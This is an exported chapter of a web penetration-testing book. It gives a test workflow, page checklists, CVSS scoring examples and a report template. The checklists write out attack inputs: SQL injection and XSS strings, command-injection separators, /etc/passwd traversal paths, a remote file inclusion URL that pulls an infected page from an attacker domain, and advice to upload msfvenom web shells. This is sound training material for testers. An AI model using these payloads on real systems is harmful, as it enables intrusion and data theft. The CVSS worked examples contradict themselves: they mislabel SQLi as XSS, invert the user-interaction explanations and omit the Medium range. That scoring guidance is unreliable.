- en: Web Intrusion Tests
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: 'The purpose of this whole book was mainly to get to this topic: the **Web Intrusion
    Test,** also known as the **Web Penetration Test**. You probably bought the book
    because of this topic, but you need to know that web penetration testing is only
    one piece of the puzzle. In order to achieve a successful, full penetration test,
    you need to include Threat Modeling, Source Code Review, and network pentests,
    as well.'
  prefs: []
  type: TYPE_NORMAL
- en: The [Chapter 7](78c64b12-3d5c-4547-bf16-ab035fcd39c0.xhtml), *Application Threat
    Modeling*, should have given you an architectural overview of web applications,
    and the Source Code Review should've given you a deep understanding too. Don't
    forget network pentests, which can reveal interesting vulnerabilities. I've created
    this sequence of chapters for a reason—to reflect real-life scenarios. I'm not
    writing this book for money; in fact, I want my readers to wonder, *who is the
    author of this book? Let me buy him a beer!*
  prefs: []
  type: TYPE_NORMAL
- en: 'As I have done previously, I will do my best to write this chapter with minimum
    philosophy and maximum straight-to-the-point contents. For that reason, let''s
    skip all the talking and start this amazing chapter, which will cover the following
    topics:'
  prefs: []
  type: TYPE_NORMAL
- en: Web Intrusion Test workflow
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: Identifying hidden web contents
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: Common web page testing checklist
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: Special page testing checklist
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: Reporting
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: Web Intrusion Test workflow
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: 'This is the most important section of this chapter, because it will allow you
    to structure your tests. A challenge that a typical pen tester will face is everyone
    telling them to refer to the OWASP checklist for web intrusion tests. But, the
    big questions that all testers will ask themselves are, *where do I start? **How
    do I proceed with the checklist?* Before I get into the steps, let''s take a look
    at an image of this workflow, a picture worth a thousand words. My workflow is
    based on a proxy-based tool: Burp Pro. Please refer to [Chapter 4](af3c338d-d137-4283-85d7-08e4ecc88ac5.xhtml), *All
    About Using Burp Suite* at the beginning of this book for more details:'
  prefs: []
  type: TYPE_NORMAL
- en: '![](Images/a2e4cd99-177c-4881-b4c0-9c033ce7a617.png)'
  prefs: []
  type: TYPE_IMG
- en: The first step is not mentioned in the preceding diagram; it's the web server
    vulnerability assessment, which we discussed in the previous chapter.
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: The second step is to fire Burp and make sure that the intercept is on in the
    Proxy tab. Next, start browsing each page separately, and check the contents through
    the proxy Request/Response details. While you're browsing, try to interact with
    each page, manually sending form post requests with data. Also, try to use the
    search button on the search page. You get the idea; don't just click around blindly.
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: Crawl the pages using **Burp Spider** and **Burp Content Discovery**. You can
    use other tools for crawling, as well; check the previous chapter, in the HTTP
    enumeration section.
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: Identify any hidden contents, such as the `robots.txt` file. We will show the
    checklist later in this chapter (for the time being, work on getting the big picture).
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: Burp will list all of the pages and files found in the Target tab. For each
    page found, perform the steps that follow.
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: Send each request to the **Burp Scanner** to scan for issues automatically.
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: 'For manual scanning, you will need to ask the following question: *is it a
    special page?* (For example, a login page; again, don''t worry. I will list all
    of the details later.)'
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: If it's a special page, we will go through the checklist specific to that page.
    For example, if it's a login page, we will test the default credentials. After
    that, we will go through the common checklist.
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: If it's not a special page, we will go straight to the common checklist (checking
    comments, input testing for SQLi, and so on).
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: Gather all of the vulnerabilities found and create a report from them.
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: Identifying hidden contents
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: 'Practically speaking, the big question that you will ask yourself is, *what
    do I need to find?* You will need a solid checklist to refer to when it''s time
    for your web intrusion test. That being said, here''s a checklist that you can
    use for this step in the workflow:'
  prefs: []
  type: TYPE_NORMAL
- en: '`Robots.txt` file'
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: Backup files (`.bak`, `.old`)
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: Other interesting files (`.xls`, `.doc`, `.pdf`, `.txt`)
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: Administration URL (for example, `phpmyadmin, wp-admin`)
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: Debugging leftover pages and URLs
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: Is CMS used? (WordPress)
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: 'If you find any item in the preceding list, check its contents for juicy information,
    including:'
  prefs: []
  type: TYPE_NORMAL
- en: Personal information
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: Email addresses
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: Credentials
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: An entry point to another system (for example, WordPress)
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: Common web page checklist
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: 'This is at the heart of the checklist for web intrusion testing. As mentioned
    in the preceding workflow, you will need to apply this checklist to every page,
    regardless of its nature. Let''s dive in:'
  prefs: []
  type: TYPE_NORMAL
- en: 'Identify the **entry points** to the web page (which lead to the backend; remember
    that we will use the entry points in the next steps), including:'
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: URLs
  prefs:
  - PREF_IND
  - PREF_UL
  type: TYPE_NORMAL
- en: Headers (for example, cookie, URL referrer, and so on)
  prefs:
  - PREF_IND
  - PREF_UL
  type: TYPE_NORMAL
- en: HTML controls (drop-down list, radio button, hidden input, textbox, and so on)
  prefs:
  - PREF_IND
  - PREF_UL
  type: TYPE_NORMAL
- en: Check all of the backend or third-party web services and web APIs called using
    Burp Target.
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '**Force** the URL into **HTTP** mode, and see if it works, or if it stays in
    HTTPS.'
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: Try to make the page **generate an error**; in another words, do error messages
    reveal clues to hackers?
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: Test for **logic flaws** (for example, purchasing an item with zero dollars,
    or applying a randomly generated discount).
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: Can we load the page **without authentication**? Use Request in browser in Burp (unless
    it's not meant to be protected).
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: Try to **call an admin page or resource** (for example, web APIs and images)
    directly, with a low-level privilege.
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: Test with **multiple accounts that have different privileges** (normal users
    versus admins). Use Burp's compare site maps feature to accomplish this task.
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: 'Check the **header security best practices,** making sure that the following
    values exist:'
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '`X-frame-options`'
  prefs:
  - PREF_IND
  - PREF_UL
  type: TYPE_NORMAL
- en: '`X-content-type-options`'
  prefs:
  - PREF_IND
  - PREF_UL
  type: TYPE_NORMAL
- en: '`Strict-transport-security`'
  prefs:
  - PREF_IND
  - PREF_UL
  type: TYPE_NORMAL
- en: '`Content-security-policy`'
  prefs:
  - PREF_IND
  - PREF_UL
  type: TYPE_NORMAL
- en: '`X-permitted-cross-domain-policies`'
  prefs:
  - PREF_IND
  - PREF_UL
  type: TYPE_NORMAL
- en: '`X-XSS-protection:1;mode=block`'
  prefs:
  - PREF_IND
  - PREF_UL
  type: TYPE_NORMAL
- en: '`X-content-type-options:nosniff`'
  prefs:
  - PREF_IND
  - PREF_UL
  type: TYPE_NORMAL
- en: Analyze the **cookie/sessionID** for **randomness** by sending it to the Burp
    Sequencer.
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '**Brute-force** the **cookie/sessionID** by sending it to Burp Intruder. Choose sniper
    as an attack type, and for the payload type, set it to Character Frobber.'
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: Make sure that **a new session** will be generated after each login.
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: Try to **decode the cookie/sessionID** (or ASP.NET ViewState) using Burp Decoder.
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '**Manipulate the cookie parameters** (for example, change `isAdmin=0` to `isAdmin=1`).'
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: What is the **duration of the session timeout**?
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: 'Check the **client source code** (HTML and JavaScript), looking for:'
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: HTML comments
  prefs:
  - PREF_IND
  - PREF_UL
  type: TYPE_NORMAL
- en: Debugging leftovers
  prefs:
  - PREF_IND
  - PREF_UL
  type: TYPE_NORMAL
- en: Security logic flaws
  prefs:
  - PREF_IND
  - PREF_UL
  type: TYPE_NORMAL
- en: The contents of the hidden input controls
  prefs:
  - PREF_IND
  - PREF_UL
  type: TYPE_NORMAL
- en: Disabled controls (for example, `<input disabled="true" name="secret">`)
  prefs:
  - PREF_IND
  - PREF_UL
  type: TYPE_NORMAL
- en: Check whether the **logout button exists** on all of the authenticated pages.
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '**Search for an ID** (for example, `EmployeeID= 100`) in the entry points,
    and brute-force it using Burp Intruder. Generally, this test will allow you to
    reveal other users'' data (two accounts with the same privileges, for example).'
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: Try to **access resources** that the testing account is not allowed to see (for
    example, pictures, documents, and so on).
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: Test for **CSRF** using Burp CSRF POC. Generally, the Burp scanner will detect
    it automatically.
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: Try to **bypass each HTML control that has client-side validation** (for example,
    `<form action='addItem.aspx' onsubmit='return validate(this)' >`); check to see
    whether the server side will validate it, as well.
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: 'Test for **SQL Injection** by using fuzzing techniques (use Burp Intruder or
    Repeater), and inject the following:'
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '`''`'
  prefs:
  - PREF_IND
  - PREF_UL
  type: TYPE_NORMAL
- en: 1; wait for delay `'0:15:0'--`
  prefs:
  - PREF_IND
  - PREF_UL
  type: TYPE_NORMAL
- en: 'Use SQL map to automate it:'
  prefs:
  - PREF_IND
  - PREF_UL
  type: TYPE_NORMAL
- en: '[PRE0]'
  prefs: []
  type: TYPE_PRE
- en: 'If you received an error message, or if the delay was executed, use **SQL map
    to dump the database** (for the following example, we already identified that
    `http://10.0.0.100/index.php?id=234` is a candidate, and that the database is
    MySQL):'
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '[PRE1]'
  prefs: []
  type: TYPE_PRE
- en: 'Test for **XSS** by using fuzzing techniques (use Burp Intruder or Repeater),
    and try to inject the following:'
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '`<script> alert(1) </script>`'
  prefs:
  - PREF_IND
  - PREF_UL
  type: TYPE_NORMAL
- en: '`"><script>alert(1)</script>`'
  prefs:
  - PREF_IND
  - PREF_UL
  type: TYPE_NORMAL
- en: 'Test for **Command Injection** by using fuzzing techniques (use Burp Intruder
    or Repeater), and try to inject the following (I will use the `whoami` command,
    since it exists on both Windows and Linux):'
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '`& whoami`'
  prefs:
  - PREF_IND
  - PREF_UL
  type: TYPE_NORMAL
- en: '`| whoami`'
  prefs:
  - PREF_IND
  - PREF_UL
  type: TYPE_NORMAL
- en: '`|| whoami`'
  prefs:
  - PREF_IND
  - PREF_UL
  type: TYPE_NORMAL
- en: '`; whoami`'
  prefs:
  - PREF_IND
  - PREF_UL
  type: TYPE_NORMAL
- en: 'Test for Local File Inclusion by using fuzzing techniques (use Burp Intruder
    or Repeater), and try to inject the following (try to manually change the number
    of slashes to get to the correct directory):'
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '`Linux: ../../../../etc/passwd`'
  prefs:
  - PREF_IND
  - PREF_UL
  type: TYPE_NORMAL
- en: '`Windows: ../../../../boot.ini`'
  prefs:
  - PREF_IND
  - PREF_UL
  type: TYPE_NORMAL
- en: Test for **Remote File Inclusion** by injecting the URL of another website (for
    example, `http://[victim domain]/page.php?file=http://[attacker domain]/[infected
    page]`).
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: The OWASP offers a handful of items for manual web intrusion tests at [https://www.owasp.org/index.php/OWASP_Testing_Guide_v4_Table_of_Contents](https://www.owasp.org/index.php/OWASP_Testing_Guide_v4_Table_of_Contents).
  prefs: []
  type: TYPE_NORMAL
- en: Special pages checklist
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: 'You will encounter some specific pages during pen tests, and when you do, you''ll
    have to use a checklist different from the one we used before. Take note that
    you will still need to use the common checklist too, after finishing this step:'
  prefs: []
  type: TYPE_NORMAL
- en: '**Login page** (this includes the admin page):'
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: Test for default credentials (for example, `username= admin` and `password=
    admin`).
  prefs:
  - PREF_IND
  - PREF_OL
  type: TYPE_NORMAL
- en: Brute-force credentials using a dictionary file.
  prefs:
  - PREF_IND
  - PREF_OL
  type: TYPE_NORMAL
- en: Test for a lockout after a number of failed attempts for accomplishing a DOS
    instead.
  prefs:
  - PREF_IND
  - PREF_OL
  type: TYPE_NORMAL
- en: Does it use CAPTCHA? It allows for defending against automated attacks.
  prefs:
  - PREF_IND
  - PREF_OL
  type: TYPE_NORMAL
- en: Use SQL injection to bypass authentication.
  prefs:
  - PREF_IND
  - PREF_OL
  type: TYPE_NORMAL
- en: Do they use remember me passwords?
  prefs:
  - PREF_IND
  - PREF_OL
  type: TYPE_NORMAL
- en: '**Registration page**:'
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: Do they allow weak passwords?
  prefs:
  - PREF_IND
  - PREF_OL
  type: TYPE_NORMAL
- en: If you register with an existing username, will you be able to enumerate users?
  prefs:
  - PREF_IND
  - PREF_OL
  type: TYPE_NORMAL
- en: Test for weak, pre-generated questions and answers (for example, favorite color,
    which can easily be brute-forced).
  prefs:
  - PREF_IND
  - PREF_OL
  type: TYPE_NORMAL
- en: '**Reset/change password page**:'
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: Test whether a user can change someone else's password (for example, change
    the admin password).
  prefs:
  - PREF_IND
  - PREF_OL
  type: TYPE_NORMAL
- en: Check the workflow of password changing and resetting.
  prefs:
  - PREF_IND
  - PREF_OL
  type: TYPE_NORMAL
- en: Does the user receive a confirmation email after the change/reset?
  prefs:
  - PREF_IND
  - PREF_OL
  type: TYPE_NORMAL
- en: What information is required to reset/change a password?
  prefs:
  - PREF_IND
  - PREF_OL
  type: TYPE_NORMAL
- en: How strong (or random) are the new, temporary passwords (for password resets)?
  prefs:
  - PREF_IND
  - PREF_OL
  type: TYPE_NORMAL
- en: Is the user forced to change the random password after his or her first login
    (for password resets)?
  prefs:
  - PREF_IND
  - PREF_OL
  type: TYPE_NORMAL
- en: For password changes, is the user required to enter his or her old password
    during the changing process?
  prefs:
  - PREF_IND
  - PREF_OL
  type: TYPE_NORMAL
- en: '**Upload page**:'
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: Can you upload a web shell? (Use `msfvenom`.)
  prefs:
  - PREF_IND
  - PREF_OL
  type: TYPE_NORMAL
- en: If the application allows for executables to be uploaded, will you be able to
    upload a backdoor? (Use `msfvenom`.)
  prefs:
  - PREF_IND
  - PREF_OL
  type: TYPE_NORMAL
- en: After uploading, can you access the files through a URL? Can you see others
    users' files?
  prefs:
  - PREF_IND
  - PREF_OL
  type: TYPE_NORMAL
- en: Reporting
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: 'After finishing your penetration testing activities, you will need to create
    a report. People tend to copy and paste from the tools'' (Burp, Nessus, and so
    on) auto generated reports. This is what differentiates an amateur from a professional:
    the latter will make sure to verify the false positives and re-evaluate the scoring
    of a vulnerability. In this section, I will show you how to evaluate the scoring
    of your findings, and after that, I will share a template that you can use to
    get ideas for your future reporting activities.'
  prefs: []
  type: TYPE_NORMAL
- en: Common Vulnerability Scoring System – CVSS
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: 'The **Common Vulnerability Scoring System** (**CVSS**) v3 came out a while
    ago, as an enhancement for CVSS v2\. The big question is: why do you need to calculate
    it, if it''s already done by the tool (for example, Burp)? Let me give you an
    example. Suppose that you have found an SQL Injection vulnerability, and the report
    tells you that the score is high. In reality, the server that was tested was disconnected
    from the internet and available on a specific VLAN, and on top of that, the data
    stored in the database was not confidential. Should you still consider the score
    to be high? Of course not! That''s why you always need to recalculate your score,
    to make sure that it matches the reality.'
  prefs: []
  type: TYPE_NORMAL
- en: Here, I'm using CVSS v3, but you can use the online calculator at [https://www.first.org/cvss/calculator/3.0](https://www.first.org/cvss/calculator/3.0).
  prefs: []
  type: TYPE_NORMAL
- en: 'The CVSS takes the following variables into consideration (you will understand
    the meaning of each one of them later):'
  prefs: []
  type: TYPE_NORMAL
- en: '**Attack Vector (AV)**: Network (N), Adjacent (A), Local (L), Physical (P)'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: '**Attack Complexity (AC)**: Low (L), High (H)'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: '**Privileges Required (PR)**: None (N), Low (L), High (H)'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: '**User Interaction (UI)**: None (N), Required (R)'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: '**Scope (S)**: Unchanged (U), Changed (C)'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: '**Confidentiality (C)**: None (N), Low (L), High (H)'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: '**Integrity (I)**: None (N), Low (L), High (H)'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: '**Availability (A)**: None (N), Low (L), High (H)'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: Some people prefer to use the DREAD methodology to calculate the score. It's
    a personal choice; in the end, you need to make sure that you have an accurate
    measure that helps your organization (or client). Also, you can use both at the
    same time, it's an overhead; but again, there is no preference. Discuss it with
    the team to find out what their favorite method is. In the end, you need to take
    it into consideration that most of the tools use the **National Vulnerability
    Database** (**NVD**), and this uses CVSS to calculate the score.
  prefs: []
  type: TYPE_NORMAL
- en: 'How can we say that a score of 9 is high, or critical? You don''t need to bump
    your head against the wall; here''s the score guidance: **CVSS V3 Base Score**:
    0-10'
  prefs: []
  type: TYPE_NORMAL
- en: '| **Severity** | **Base Score Range** |'
  prefs: []
  type: TYPE_TB
- en: '| None | 0 |'
  prefs: []
  type: TYPE_TB
- en: '| Low | 0.1 - 3.9 |'
  prefs: []
  type: TYPE_TB
- en: '| Medium |'
  prefs: []
  type: TYPE_TB
- en: '| High | 7.0 - 8.9 |'
  prefs: []
  type: TYPE_TB
- en: '| Critical | 9.0 - 10.0 |'
  prefs: []
  type: TYPE_TB
- en: 'Let''s look at a practical example to calculate the CVSS scores of two vulnerabilities:'
  prefs: []
  type: TYPE_NORMAL
- en: SQL Injection
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: Reflected XSS
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: The web server is accessible through the internet, and the database stores confidential
    data(Clients personal information).
  prefs: []
  type: TYPE_NORMAL
- en: First case – SQLi
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: 'The tester was able to execute an SQL injection by injecting a single quote,
    and later, he used SQL map to dump the whole database:'
  prefs: []
  type: TYPE_NORMAL
- en: '**AV:N**: The hacker will connect through a network to execute the attack.'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: '**AC:L**: The complexity is very low, since it''s a reflected XSS (we had an
    error message when we injected the single quote, `''`, into the URL query string).'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: '**PR:N**: No privilege is required.'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: '**UI:R**: The victim doesn''t need to interact with the payload.'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: '**S:C**: The scope is not the web server only; the database is impacted, as
    well.'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: '**C:H**: Since the database contains confidential data.'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: '**I:H**: The hacker can change the data in the database by executing SQL commands
    remotely.'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: '**A:H**: The hacker can delete all of the records, making the database unavailable.'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: '![](Images/8c18e009-3b91-4342-a469-3d6181b7ce69.png)'
  prefs: []
  type: TYPE_IMG
- en: Second case – Reflected XSS
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: 'The tester was able to inject JavaScript into the URL parameter, and the browser
    executed the script:'
  prefs: []
  type: TYPE_NORMAL
- en: '**AV:N**: The hacker will connect through a network to execute the attack.'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: '**AC:L**: The complexity is very low; the hacker tested the JavaScript on all
    browsers, and it worked.'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: '**PR:N**: No privilege is required.'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: '**UI:N**: The victim needs to click on a link through a social engineering
    attack.'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: '**S:C**: The scope is not the web server only; the victim browser is impacted,
    as well.'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: '**C:L**: Since the `HttpOnly` flag is set, the confidentiality impact is low,
    because the attacker has not accessed sufficient cookie data to hijack the victim''s
    session.'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: '**I:L**: The hacker can probably change the data only in the victim''s browser
    context.'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: '**A:N**: The hacker will not be able to impact the availability of the server.'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: '![](Images/f5c3058f-98f4-4ce5-a9ab-299bf19425d4.png)'
  prefs: []
  type: TYPE_IMG
- en: Report template
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: In this section, I will share a report template that you can use after finishing
    a pentration test (either for Web Intrusion Test or Network Penetration Test).
  prefs: []
  type: TYPE_NORMAL
- en: '**The Cover Page**:'
  prefs: []
  type: TYPE_NORMAL
- en: '`[Company Name] – [Project Name] – Security Tests Report`'
  prefs: []
  type: TYPE_NORMAL
- en: '**Table of Contents**:'
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE2]'
  prefs: []
  type: TYPE_PRE
- en: '**History Log**:'
  prefs: []
  type: TYPE_NORMAL
- en: '| **Version** | **Date** | **Modified by** | **Short Description** |'
  prefs: []
  type: TYPE_TB
- en: '| Version # | [Todays Date] | [Your Name] |  |'
  prefs: []
  type: TYPE_TB
- en: '**Summary**:'
  prefs: []
  type: TYPE_NORMAL
- en: 'The following table shows the number of issues identified in different categories.
    Issues are classified as critical, high, medium, or low, according to their severity, using
    the CVSS v3 methodology. This reflects the likely impact of each issue for [COMPANY
    NAME]:'
  prefs: []
  type: TYPE_NORMAL
- en: '| **Severity** | **Vulnerability Description** | **Occurrences** |'
  prefs: []
  type: TYPE_TB
- en: '| Critical/High/Medium/Low | Flaw Name (for example, Reflected XSS) | 1 to
    Infinity |'
  prefs: []
  type: TYPE_TB
- en: '[**Vulnerability Name**] (You will repeat this section for all of the findings
    during the pen tests.)'
  prefs: []
  type: TYPE_NORMAL
- en: '**Summary**:'
  prefs: []
  type: TYPE_NORMAL
- en: '| **Severity**:   | Critical/High/Medium/Low |'
  prefs: []
  type: TYPE_TB
- en: '| **Confidence**:   | Certain/Tentative |'
  prefs: []
  type: TYPE_TB
- en: '| **Host/URL**:   | Target IP address/URL |'
  prefs: []
  type: TYPE_TB
- en: '**CVSS Score**:'
  prefs: []
  type: TYPE_NORMAL
- en: '![](Images/19cca8e1-e19e-4211-9b44-fac1656a3265.png)'
  prefs: []
  type: TYPE_IMG
- en: '**Issue description**:'
  prefs: []
  type: TYPE_NORMAL
- en: '[Here, you need to specify a description of the vulnerability.]'
  prefs: []
  type: TYPE_NORMAL
- en: '**Issue remediation**:'
  prefs: []
  type: TYPE_NORMAL
- en: '[People need to know how to fix the vulnerabilities. In this section, you will
    add all necessary information, including the technical details for remediation.]'
  prefs: []
  type: TYPE_NORMAL
- en: '**Proof**:'
  prefs: []
  type: TYPE_NORMAL
- en: '[In this section, you need to add all of the proof gathered from your pen tests;
    for example, screenshots, exploit source codes, requests/responses from web intrusion
    tests—you get the idea.]'
  prefs: []
  type: TYPE_NORMAL
- en: Summary
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: I hope that you liked this chapter. Most importantly, I hope that it will help
    you get your pen test tasks done quickly and efficiently. The workflow that I
    shared with you in this chapter is the secret sauce for your success; I use it
    during my own pen tests. I did my best to give you a checklist without nitty-gritty
    details, because you should've learned those at the beginning of this book (especially
    in [Chapter 5](3ebde1b5-8f24-4c13-984c-c5a3bdf83b58.xhtml), *Understanding Web
    Application Vulnerabilities*). I structured the book this way for a reason.
  prefs: []
  type: TYPE_NORMAL
- en: At this point, you've seen all of the activities for penetration testing, from
    Threat Modeling to Web Intrusion Testing. What's next? Now that you've seen it
    all, the next step is to learn how to automate penetration testing tasks by using
    the amazing programming language that is Python.
  prefs: []
  type: TYPE_NORMAL
